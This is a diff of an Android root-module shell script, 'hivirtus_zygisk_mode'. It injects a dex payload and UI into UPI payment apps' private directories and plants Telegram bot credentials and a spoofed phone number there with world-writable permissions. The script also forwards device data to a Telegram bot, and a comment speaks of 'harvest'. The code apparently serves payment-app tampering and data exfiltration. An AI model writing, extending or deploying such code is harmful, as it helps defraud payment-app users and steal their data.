@@ -189,24 +189,47 @@ sync_config() {
     TG_C=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
     if [ -n "$TG_T" ] && [ -n "$TG_C" ]; then
       OLD_HASH=$(cat /data/local/tmp/hivirtus_tg_creds.hash 2>/dev/null)
-      SENT_HASH=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null)
       NEW_HASH="${TG_T}|${TG_C}"
       printf '%s\n' "{\"telegram_bot_token\":\"${TG_T}\",\"telegram_chat_id\":\"${TG_C}\"}" \
         > /data/local/tmp/hivirtus_telegram_credentials.json
+      printf '%s\n' "{\"telegram_bot_token\":\"${TG_T}\",\"telegram_chat_id\":\"${TG_C}\"}" \
+        > "$MODDIR/telegram_credentials.json" 2>/dev/null
       chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
-      # Test ONLY when token/chat actually changes — never on every Save / save_ok flag
-      if [ "$NEW_HASH" != "$OLD_HASH" ] && [ "$NEW_HASH" != "$SENT_HASH" ]; then
+      # Promote sender id to module
+      if [ -f /data/local/tmp/hivirtus_sender_id.txt ]; then
+        cp -f /data/local/tmp/hivirtus_sender_id.txt "$MODDIR/sender_id.txt" 2>/dev/null
+      fi
+      if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
+        cp -f /data/local/tmp/hivirtus_ui_save.json "$MODDIR/ui_save.json" 2>/dev/null
+      fi
+      # Push to all apps only on Save / new creds (not every 2s)
+      NEED_PUSH=0
+      [ -f /data/local/tmp/hivirtus_save_ok.flag ] && NEED_PUSH=1
+      [ "$NEW_HASH" != "$OLD_HASH" ] && NEED_PUSH=1
+      if [ "$NEED_PUSH" = "1" ]; then
+        hivirtus_seed_app_code_cache 2>/dev/null
+      fi
+
+      # TG test: (1) new token OR (2) explicit Save with 3-min cooldown
+      QUEUE=0
+      if [ "$NEW_HASH" != "$OLD_HASH" ]; then
+        QUEUE=1
         echo "$NEW_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
-        echo 1 > /data/local/tmp/hivirtus_tg_test.request
-        rm -f /data/local/tmp/hivirtus_tg_test_fails /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null
-        chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
-        echo "tg_test_queued $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-      else
-        # Same creds — clear Save ping, do NOT re-queue test
-        rm -f /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null
-        if [ "$NEW_HASH" = "$SENT_HASH" ] || [ "$NEW_HASH" = "$OLD_HASH" ]; then
-          echo "$NEW_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
+        echo "tg_test_queued_new_creds $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+      elif [ -f /data/local/tmp/hivirtus_save_ok.flag ]; then
+        NOW=$(date +%s)
+        LAST=$(cat /data/local/tmp/hivirtus_tg_manual_test.ts 2>/dev/null || echo 0)
+        if [ $((NOW - LAST)) -ge 180 ]; then
+          QUEUE=1
+          echo "$NOW" > /data/local/tmp/hivirtus_tg_manual_test.ts
+          echo "tg_test_queued_save $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
         fi
+      fi
+      rm -f /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null
+      if [ "$QUEUE" = "1" ]; then
+        echo 1 > /data/local/tmp/hivirtus_tg_test.request
+        rm -f /data/local/tmp/hivirtus_tg_test_fails /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null
+        chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
       fi
     fi
   fi
@@ -232,7 +255,8 @@ mark_active() {
   hivirtus_mark_foreground_upi "$1"
 }
 
-# Android 16: copy bridge.dex + UI into each UPI app code_cache (tmp unreadable)
+# Android 16: copy bridge.dex + UI + GLOBAL config into each UPI app
+# (ek baar Save → har app me token/sender/phone dikhe)
 hivirtus_seed_app_code_cache() {
   local pkg uid dest mod
   mod="/data/adb/modules/hivirtus_zygisk_mode"
@@ -253,10 +277,40 @@ hivirtus_seed_app_code_cache() {
       mkdir -p "$dest/ui" 2>/dev/null
       cp -f "$mod/bridge.dex" "$dest/bridge.dex" 2>/dev/null
       cp -f "$mod/ui/"* "$dest/ui/" 2>/dev/null
+      # Global settings push
+      [ -f /data/local/tmp/hivirtus_ui_save.json ] && \
+        cp -f /data/local/tmp/hivirtus_ui_save.json "$dest/ui_save.json" 2>/dev/null
+      [ -f /data/local/tmp/hivirtus_zygisk_mode_config.json ] && \
+        cp -f /data/local/tmp/hivirtus_zygisk_mode_config.json "$dest/config.json" 2>/dev/null
+      [ -f /data/local/tmp/hivirtus_telegram_credentials.json ] && \
+        cp -f /data/local/tmp/hivirtus_telegram_credentials.json "$dest/hivirtus_telegram_credentials.json" 2>/dev/null
+      [ -f /data/local/tmp/hivirtus_sender_id.txt ] && \
+        cp -f /data/local/tmp/hivirtus_sender_id.txt "$dest/hivirtus_sender_id.txt" 2>/dev/null
+      [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && \
+        cp -f /data/local/tmp/hivirtus_spoof_phone.txt "$dest/hivirtus_spoof_phone.txt" 2>/dev/null
       chmod 755 "$dest" "$dest/ui" 2>/dev/null
       chmod 644 "$dest/bridge.dex" "$dest/ui/"* 2>/dev/null
+      chmod 666 "$dest/ui_save.json" "$dest/config.json" \
+        "$dest/hivirtus_telegram_credentials.json" "$dest/hivirtus_sender_id.txt" \
+        "$dest/hivirtus_spoof_phone.txt" 2>/dev/null
       chown -R "$uid:$uid" "$dest" 2>/dev/null
       restorecon -R "$dest" 2>/dev/null
+    done
+    # Also filesDir — JsBridge readConfig pehle yahan dekhta hai
+    for fdir in "/data/data/$pkg/files" "/data/user/0/$pkg/files"; do
+      [ -d "$fdir" ] || continue
+      [ -f /data/local/tmp/hivirtus_ui_save.json ] && \
+        cp -f /data/local/tmp/hivirtus_ui_save.json "$fdir/hivirtus_ui_save.json" 2>/dev/null
+      [ -f /data/local/tmp/hivirtus_telegram_credentials.json ] && \
+        cp -f /data/local/tmp/hivirtus_telegram_credentials.json "$fdir/hivirtus_telegram_credentials.json" 2>/dev/null
+      [ -f /data/local/tmp/hivirtus_sender_id.txt ] && \
+        cp -f /data/local/tmp/hivirtus_sender_id.txt "$fdir/hivirtus_sender_id.txt" 2>/dev/null
+      [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && \
+        cp -f /data/local/tmp/hivirtus_spoof_phone.txt "$fdir/hivirtus_spoof_phone.txt" 2>/dev/null
+      chmod 666 "$fdir/hivirtus_ui_save.json" "$fdir/hivirtus_telegram_credentials.json" \
+        "$fdir/hivirtus_sender_id.txt" "$fdir/hivirtus_spoof_phone.txt" 2>/dev/null
+      chown "$uid:$uid" "$fdir/hivirtus_ui_save.json" "$fdir/hivirtus_telegram_credentials.json" \
+        "$fdir/hivirtus_sender_id.txt" "$fdir/hivirtus_spoof_phone.txt" 2>/dev/null
     done
   done
   echo "code_cache_seeded $(date +%s)" >> /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
@@ -623,7 +677,7 @@ tg_http_post() {
   return 1
 }
 
-# Save pe Telegram test — exact format user ne diya (MAX 1 per token|chat)
+# Save pe Telegram test — exact format (rate-limited; Save can retest)
 send_tg_test_if_requested() {
   [ -f /data/local/tmp/hivirtus_tg_test.request ] || return 0
   read_tg_creds
@@ -632,13 +686,7 @@ send_tg_test_if_requested() {
     return 0
   fi
   CUR_HASH="${TG_TOKEN}|${TG_CHAT}"
-  SENT_HASH=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null)
-  # Already sent for these creds — drop request (stops Save/harvest spam)
-  if [ -n "$SENT_HASH" ] && [ "$CUR_HASH" = "$SENT_HASH" ]; then
-    rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails
-    return 0
-  fi
-  # Rate limit: at most 1 attempt per 60s even if request keeps reappearing
+  # Rate limit attempts (not permanent block) — 60s between tries
   NOW=$(date +%s)
   LAST_TRY=$(cat /data/local/tmp/hivirtus_tg_test_last_try.ts 2>/dev/null || echo 0)
   if [ $((NOW - LAST_TRY)) -lt 60 ] && [ -f /data/local/tmp/hivirtus_tg_test_fails ]; then
@@ -663,7 +711,6 @@ Device: ${DEV}"
   SENT=0
   if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
   if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
-    echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_test_sent.hash
     echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
     rm -f /data/local/tmp/hivirtus_tg_test.request "$PAYLOAD" /data/local/tmp/hivirtus_tg_test_fails
     echo "tg_test_ok $STATUS device=$DEV $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
@@ -672,8 +719,6 @@ Device: ${DEV}"
     FAILS=$((FAILS + 1))
     echo "$FAILS" > /data/local/tmp/hivirtus_tg_test_fails
     if [ "$FAILS" -ge 2 ]; then
-      # Give up — mark as sent-attempted so we don't spam forever
-      echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_test_sent.hash
       rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails "$PAYLOAD"
     fi
     echo "tg_test_fail $(date +%s) resp=$(head -c 120 "$RESP" 2>/dev/null)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
